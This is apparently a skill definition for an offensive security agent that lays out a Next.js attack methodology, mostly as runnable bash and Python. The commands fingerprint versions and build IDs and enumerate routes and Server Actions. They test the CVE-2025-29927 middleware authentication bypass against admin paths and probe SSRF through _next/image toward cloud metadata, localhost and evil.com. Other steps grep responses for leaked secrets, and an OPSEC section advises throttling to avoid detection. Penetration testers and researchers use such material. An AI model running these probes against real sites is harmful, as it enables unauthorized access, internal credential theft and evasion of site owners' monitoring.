---
name: nextjs-recon
description: Next.js reconnaissance — app vs pages router detection, server actions, RSC data leakage, middleware bypass, route handler audit, source map discovery, version CVE mapping
version: 1.0.0
phase: recon
category: webapp
tags: [nextjs, react, rsc, server-components, server-actions, middleware, ssr]
tools: [curl, python3, jq, nmap, playwright, katana]
difficulty: intermediate
opsec_level: high
time_estimate: 180s
severity_if_found: high
related_skills:
  - hunt-ssrf
  - hunt-idor
  - hunt-xss
  - hunt-csrf
  - hunt-server-side-js-injection
  - headless-browser-enum
  - dir-busting
mitre_attack:
  - T1190
  - T1595
  - T1583
---

## When to Use

Use this skill when tech detection identifies Next.js (__NEXT_DATA__, _next/static, Next.js response headers).
Next.js has specific attack surfaces: App Router vs Pages Router, Server Actions (RSC), middleware,
and route handlers. Frontend tech may look like a normal SPA but server components are server-rendered
and can leak data, expose internal endpoints, or allow middleware bypass.

## Prerequisites

- Target URL with Next.js detected
- curl, python3 with requests
- Browser or headless browser (Playwright) for RSC analysis
- Source map downloader (optional)

## What It Does

Next.js recon covers:

1. **Router detection** — App Router vs Pages Router, version fingerprinting
2. **Source map discovery** — _next/static/chunks/pages, JS bundle analysis
3. **Server Actions** — discover and test RSC action endpoints
4. **Route Handler enumeration** — API routes, internal routes
5. **Middleware analysis** — detect middleware matchers, auth bypass
6. **RSC data leakage** — props leakage, server component data exposure
7. **Build ID & version** — fingerprint for CVE mapping
8. **Known CVEs** — CVE-2025-29927 (middleware bypass), CVE-2024-34351 (SSRF), etc.

## Methodology

### 1. Router & Version Detection

```bash
NEXTJS_TARGET="https://TARGET"

# Check for App Router
curl -sk -D - -o /dev/null "$NEXTJS_TARGET/_next/static/chunks/app/" 2>&1 | head -5
curl -sk "$NEXTJS_TARGET/_next/static/chunks/app/layout.js" | head -20
curl -sk "$NEXTJS_TARGET/_next/static/chunks/pages/_app.js" | head -20

# Extract build ID
BUILD_ID=$(curl -sk "$NEXTJS_TARGET/_next/static/__buildManifest.js" 2>/dev/null | grep -oP '"buildId":"\K[^"]+' || \
           curl -sk "$NEXTJS_TARGET/_next/static/chunks/pages/_app.js" 2>/dev/null | grep -oP 'buildId:"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Version from __NEXT_DATA__
curl -sk "$NEXTJS_TARGET/" | grep -oP '"buildId":"\K[^"]+' || \
curl -sk "$NEXTJS_TARGET/" | grep -oP 'next-version["\']?\s*[:=]\s*["\']([\d.]+)' || \
curl -sk "$NEXTJS_TARGET/_next/static/chunks/framework-*" 2>/dev/null | head -5

# Next.js header check
curl -sk -D - -o /dev/null "$NEXTJS_TARGET/" 2>&1 | grep -i "x-powered-by\|x-nextjs\|next-js"
```

### 2. Source Map Discovery

```bash
# Build ID directory
BUILD_ID=$(curl -sk "$NEXTJS_TARGET/_next/static/__buildManifest.js" 2>/dev/null | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Common source map locations
for path in \
  "/_next/static/$BUILD_ID/_buildManifest.js" \
  "/_next/static/$BUILD_ID/_ssgManifest.js" \
  "/_next/static/$BUILD_ID/_middlewareManifest.js" \
  "/_next/static/chunks/pages/_app-$BUILD_ID.js" \
  "/_next/static/chunks/app/layout-$BUILD_ID.js" \
  "/_next/static/chunks/app/page-$BUILD_ID.js"; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "$NEXTJS_TARGET$path")
  if [ "$status" != "404" ]; then
    echo "[$status] $path"
  fi
done

# Source maps (.map extension)
for map_path in \
  "/_next/static/chunks/pages/_app.js.map" \
  "/_next/static/chunks/webpack.js.map" \
  "/_next/static/chunks/framework.js.map"; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "$NEXTJS_TARGET$map_path")
  if [ "$status" = "200" ]; then
    echo "SOURCE MAP FOUND: $map_path"
  fi
done

# Download and analyze JS bundles for API routes
curl -sk "$NEXTJS_TARGET/_next/static/chunks/pages/_app.js" 2>/dev/null | grep -oiP '/api/[a-z0-9/_-]+' | sort -u
```

### 3. Server Actions & RSC Endpoint Discovery

```bash
# Check for RSC endpoint (App Router)
RSC_RESP=$(curl -sk -D - \
  -H "RSC: 1" \
  -H "Next-Action: " \
  "$NEXTJS_TARGET/" 2>&1)
echo "$RSC_RESP" | grep -i "content-type\|rsc\|action"

# App Router RSC endpoint
curl -sk -D - -o /dev/null \
  -H "RSC: 1" \
  -H "Accept: text/x-component" \
  "$NEXTJS_TARGET/" 2>&1 | head -10

# Discover Server Actions from JS bundles
curl -sk "$NEXTJS_TARGET/_next/static/chunks/app/page.js" 2>/dev/null | grep -oP 'actionId:"[^"]+"' | sort -u
curl -sk "$NEXTJS_TARGET/_next/static/chunks/app/page.js" 2>/dev/null | grep -oP 'next-action/[a-zA-Z0-9_-]+' | sort -u

# Server Action endpoint test
ACTION_ID=$(curl -sk "$NEXTJS_TARGET/_next/static/chunks/app/page.js" 2>/dev/null | grep -oP 'actionId:"[^"]+"' | head -1 | cut -d'"' -f2)
if [ -n "$ACTION_ID" ]; then
  curl -sk -X POST "$NEXTJS_TARGET/" \
    -H "Next-Action: $ACTION_ID" \
    -H "Content-Type: text/plain;charset=UTF-8" \
    -d '["1",["$K1"]]' | head -20
fi
```

### 4. Route Handler & API Enumeration

```bash
# API routes (Pages Router)
for route in api api/graphql api/auth api/user api/admin api/trpc _next/data api/health; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "$NEXTJS_TARGET/$route")
  echo "[$status] /$route"
done

# App Router route handlers (internal Next.js routes)
for route in \
  "/_next/data/$BUILD_ID/index.json" \
  "/_next/data/$BUILD_ID/login.json" \
  "/_next/data/$BUILD_ID/api.json"; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "$NEXTJS_TARGET$route")
  if [ "$status" != "404" ]; then
    echo "[$status] $route (Next.js data route)"
  fi
done

# Dynamic route enumeration
for route in \
  "/api/user/" "/api/admin/" "/api/auth/" "/api/graphql" \
  "/api/tasks" "/api/files" "/api/upload" "/api/config"; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" "$NEXTJS_TARGET$route")
  method=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$NEXTJS_TARGET$route")
  if [ "$status" != "404" ] || [ "$method" != "404" ]; then
    echo "[GET:$status POST:$method] $route"
  fi
done

# Check for next.config.js exposure
curl -sk -D - -o /dev/null "$NEXTJS_TARGET/next.config.js" 2>&1
curl -sk -D - -o /dev/null "$NEXTJS_TARGET/next.config.mjs" 2>&1
```

### 5. Middleware Analysis

```bash
# Check middleware manifest
curl -sk "$NEXTJS_TARGET/_next/static/$BUILD_ID/_middlewareManifest.js" 2>/dev/null | head -100

# Extract middleware matchers
curl -sk "$NEXTJS_TARGET/_next/static/$BUILD_ID/_middlewareManifest.js" 2>/dev/null | \
  grep -oP 'source:"[^"]*"' | sort -u

# Test middleware bypass (CVE-2025-29927)
# x-middleware-subrequest header bypass
for protected_path in /admin /dashboard /settings /api/admin; do
  # Normal request
  normal=$(curl -sk -o /dev/null -w "%{http_code}" "$NEXTJS_TARGET$protected_path")
  # Bypass attempt
  bypass=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "x-middleware-subrequest: _middleware" \
    "$NEXTJS_TARGET$protected_path")
  echo "[$normal → $bypass] $protected_path"
done

# Check for middleware on specific paths using _next/data
curl -sk "$NEXTJS_TARGET/_next/data/$BUILD_ID/admin.json" 2>/dev/null | head -10
curl -sk -H "x-middleware-subrequest: _middleware" \
  "$NEXTJS_TARGET/_next/data/$BUILD_ID/admin.json" 2>/dev/null | head -10
```

### 6. RSC Data Leakage & Props Exposure

```bash
# Check if server component props are leaked in HTML
curl -sk "$NEXTJS_TARGET/" | grep -oP '__NEXT_DATA__.*?</script>' | head -1 | cut -c1-500

# Extract all __NEXT_DATA__ props
curl -sk "$NEXTJS_TARGET/" | python3 -c "
import sys, re, json
html = sys.stdin.read()
m = re.search(r'<script id=\"__NEXT_DATA__\" type=\"application/json\">(.*?)</script>', html)
if m:
    data = json.loads(m.group(1))
    # Check for props that may contain sensitive data
    if 'props' in data.get('props', {}):
        print(json.dumps(data['props'], indent=2)[:2000])
    print(f'Page props keys: {list(data.get(\"props\", {}).get(\"pageProps\", {}).keys())}')
"

# Check RSC payload for leaked internal data
curl -sk \
  -H "RSC: 1" \
  -H "Accept: text/x-component" \
  "$NEXTJS_TARGET/" 2>/dev/null | head -100 | strings | grep -i 'secret\|token\|api_key\|password\|internal' | head -10

# Check error pages for stack traces  
curl -sk -D - -o /dev/null "$NEXTJS_TARGET/_error" 2>&1
curl -sk -D - "$NEXTJS_TARGET/404" 2>&1 | head -20
curl -sk -D - "$NEXTJS_TARGET/500" 2>&1 | head -20
```

### 7. Image Optimization & SSRF

```bash
# Next.js Image Optimization SSRF (if _next/image enabled)
curl -sk -D - -o /dev/null \
  "$NEXTJS_TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=256&q=75" 2>&1

curl -sk -D - -o /dev/null \
  "$NEXTJS_TARGET/_next/image?url=http://127.0.0.1:8080/admin&w=256&q=75" 2>&1

# Static file SSRF
curl -sk -D - -o /dev/null \
  "$NEXTJS_TARGET/_next/static/media/image?url=http://internal.target:9200/" 2>&1
```

### 8. Known CVEs by Version

```bash
# CVE-2025-29927: Middleware bypass (all versions < 14.2.25, < 15.2.3)
# x-middleware-subrequest header bypass
echo "=== CVE-2025-29927: Middleware bypass ==="
for header in "x-middleware-subrequest: _middleware" "x-next-middleware-subrequest: 1"; do
  curl -sk -o /dev/null -w "%{http_code} " -H "$header" "$NEXTJS_TARGET/admin"
done
echo ""

# CVE-2024-34351: Server-Side Request Forgery (SSRF) via _next/image
# Affects Next.js <= 14.1.1
echo "=== CVE-2024-34351: SSRF via _next/image ==="
curl -sk -o /dev/null -w "%{http_code}\n" \
  "$NEXTJS_TARGET/_next/image?url=http://evil.com/test&w=256&q=75" 2>&1

# CVE-2023-46298: Open Redirect via _next/data
# Affects Next.js <= 13.4.19
echo "=== CVE-2023-46298: Open Redirect ==="
curl -sk -D - -o /dev/null "$NEXTJS_TARGET/_next/data/../../evil.com/" 2>&1 | grep -i "location"
```

## OPSEC

- **Server Actions**: Submitting RSC actions may modify server state. Be careful with POST requests.
- **Rate Limiting**: Next.js API routes may have rate limiting. Spread enumeration.
- **Source Maps**: Downloading source maps generates many requests. Throttle to avoid detection.
- **Edge Runtime**: Middleware runs on Edge Runtime — may have different CORS behavior than Node.js routes.

## Verification Checklist

- [ ] Router type identified (App vs Pages)
- [ ] Build ID and version extracted
- [ ] Source maps found (if exposed)
- [ ] Server Actions discovered
- [ ] API routes enumerated
- [ ] Middleware bypass tested (CVE-2025-29927)
- [ ] RSC data leakage checked
- [ ] Image optimization SSRF tested
- [ ] Known CVEs mapped to version

## Output Format

```json
{
  "skill": "nextjs-recon",
  "target": "TARGET",
  "status": "completed",
  "version": "14.2.15",
  "router": "app",
  "build_id": "abc123",
  "server_actions": ["action_xyz", "action_abc"],
  "middleware_matchers": ["/admin/*", "/dashboard/*"],
  "middleware_bypass": true,
  "rsc_leak": false,
  "source_maps": ["/_next/static/chunks/pages/_app.js.map"],
  "cvcs": ["CVE-2025-29927", "CVE-2024-34351"],
  "evidence": ["routes.txt", "actions.txt", "config.json"]
}
```

## References

- [Next.js Documentation](https://nextjs.org/docs)
- [CVE-2025-29927 — Middleware Bypass](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
- [CVE-2024-34351 — SSRF via _next/image](https://nvd.nist.gov/vuln/detail/CVE-2024-34351)
- [Next.js Security Advisories](https://nextjs.org/security)
- [Zhero: Next.js RSC Attacks](https://zhero-web-sec.github.io/research-and-writing/nextjs-rsc)
